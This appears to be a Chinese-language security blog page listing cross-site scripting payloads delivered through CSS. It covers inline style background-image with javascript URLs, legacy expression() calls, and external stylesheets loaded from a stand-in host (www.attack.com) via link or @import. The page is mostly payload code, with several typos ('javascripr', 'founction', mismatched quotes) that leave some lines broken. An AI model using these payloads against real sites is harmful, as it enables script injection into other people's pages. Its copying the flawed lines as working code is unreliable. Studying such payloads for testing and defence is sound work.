---
layout: default
---
# ![](../img/hj.jpg)XSS利用CSS跨站剖析

>小贱提示：
>
>这种方法是视浏览器种类而酌情利用的
>
>不同的浏览器效果不同

```html
<div style="background-image:url(javascripr:alert('XSS'))">
<style>
    body {background-image:url("javascripr:alert('XSS')");}
</style>
<div style="width:expression(alert('XSS'));">
<img src="#" style="xss:expression(alert(/XSS/));">
<style>
    body {background-image:expression(alert("XSS"));}
</style>
<div style="list-style-image:url(javascript:alert('XSS‘))">
<img style="background-image:url(javascripr:alert('XSS'))">
```

## ![](../img/github4.png)使用link或@import跨网站xss

attack.css为：
```
p {
    background-image:expression(alert("XSS"));
}
```
目标网站Exploit为：
```
<link rel="stylesheet" href="http://www.attack.com/attack.css">
```
attack.css为：
```
.showCSS{
event:expression(onload=founction( ){alert('XSS');})}
```
目标网站Exploit为：
```
<style type='text/css'>
@import url(http://www.attack.com/attack.css);</style>
```
@import还有另一个特性，可以直接执行js：
```
<style>@import 'javascript:alert("XSS")';<style>
```

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
